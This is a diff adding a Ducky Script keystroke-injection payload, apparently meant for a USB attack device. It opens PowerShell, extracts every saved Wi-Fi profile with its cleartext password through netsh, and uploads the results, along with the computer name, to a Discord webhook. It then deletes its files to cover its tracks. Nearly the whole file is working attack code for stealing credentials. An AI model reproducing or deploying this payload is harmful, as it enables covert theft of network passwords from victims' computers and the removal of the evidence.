@@ -1,0 +1,11 @@
+DELAY 1000
+GUI r
+DELAY 1000
+STRING powershell
+ENTER
+DELAY 2000
+STRING $url="YOUR-DISCORD-HOOK-URL-HERE"; (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{PROFILE_NAME=$name;PASSWORD=$pass}} | Format-Table -AutoSize >> stats.txt;$Body=@{ content = "$env:computername Altre cose potenzialmente utili:"};Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);curl.exe -F "file1=@stats.txt" $url ; Remove-Item '.\stats.txt'
+ENTER
+DELAY 500
+STRING cd C:\Users\$env:UserName\Desktop; Remove-Item Wi-Fi-*; Remove-Item stats.txt;exit
+ENTER
